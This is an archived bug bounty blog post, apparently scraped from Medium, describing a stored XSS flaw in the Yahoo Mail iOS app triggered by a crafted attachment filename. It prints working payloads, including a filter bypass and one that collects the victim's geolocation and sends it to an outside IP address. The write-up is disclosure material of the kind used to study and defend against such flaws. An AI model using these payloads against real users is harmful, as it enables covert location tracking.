---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-05-28_stored-xss-in-yahoo-mail-ios-app3500.md
original_filename: 2020-05-28_stored-xss-in-yahoo-mail-ios-app3500.md
title: Stored XSS in Yahoo mail IOS app($3500)
category: documents
detected_topics:
- xss
- command-injection
- api-security
- mobile-security
tags:
- imported
- documents
- xss
- command-injection
- api-security
- mobile-security
language: en
raw_sha256: 4cac2cf824dbf066b326ac56ff1db70fb17e3e93f2e2383993cf1a31c25be79c
text_sha256: c9c7804b14591b0d7502b9bb0db346b6ca3b35dcbf05d72c7c9a75bd44f4b476
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: false
---

# Stored XSS in Yahoo mail IOS app($3500)

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-05-28_stored-xss-in-yahoo-mail-ios-app3500.md
- Source Type: markdown
- Detected Topics: xss, command-injection, api-security, mobile-security
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: False
- Raw SHA256: `4cac2cf824dbf066b326ac56ff1db70fb17e3e93f2e2383993cf1a31c25be79c`
- Text SHA256: `c9c7804b14591b0d7502b9bb0db346b6ca3b35dcbf05d72c7c9a75bd44f4b476`


## Content

---
title: "Stored XSS in Yahoo mail IOS app($3500)"
url: "https://medium.com/@kminthein/stored-xss-in-yahoo-mail-ios-app-3500-6b40e86358b9"
authors: ["kminthein / weev3 (@kyawminthein99)"]
programs: ["Yahoo! / Verizon Media"]
bugs: ["Stored XSS"]
bounty: "3,500"
publication_date: "2020-05-28"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4559
scraped_via: "browseros"
---

# Stored XSS in Yahoo mail IOS app($3500)

Stored XSS in Yahoo mail IOS app($3500)
kminthein
Follow
2 min read
·
May 28, 2020

10

Copy from one of my 2018 blog post.

Intro

I want to share about my easy finding in Yahoo mail IOS application, easy but worth $3500.

Last 3 months ago, i found Stored XSS in Microsoft outlook mail IOS app. You can read there. So, I think “what if yahoo is vulnerable to this kind of attack? “, then i start testing on yahoo mail app. Using the same payload, the same filename with

“><img src=x onerror=alert(1)>.jpg
But, yahoo mail app didn’t pop-up, so i start digging around and change payload name to “><plaintext>. Then, finally i know there has some restrictions so i didn’t see an alert.

Get kminthein’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

All complex payload didn’t find a right solution and pentesting on IOS mail app is harder than web application. After searching around 1 hours, i found the right solution. With “><img src=x onerror=”a=alert;a(1);”.jpg can bypass this restriction.

Then i knew, the right solution. I need to pop-up something useful but in IOS app, you can’t use document.domain, document.cookies, so i used

'"><img src="x" onerror="v=prompt;navigator.geolocation.watchPosition(function(loc){m='Location latitiude'+loc.coords.latitude+'long titue'+loc.coords.longitude;v(m);b=document.createElement('img');b.src='http/104.131.35.19?c='+m;})">

payload to steal victims location. After uploading this payload and sent to victims email. If victims open this email. I will exactly knows his geolocation.

Press enter or click to view image in full size

I reported to Yahoo, and Yahoo gave me an initial reward $300 and final payout is $3200. So, total $3500. Easy money right? 😀

Thats all, sometimes you don’t need a lots of recon and skills. If you can find a right path and a right solution, you can get some money.

Btw, this is not one of my current findings, I just want to reunite all of my separate blogs.
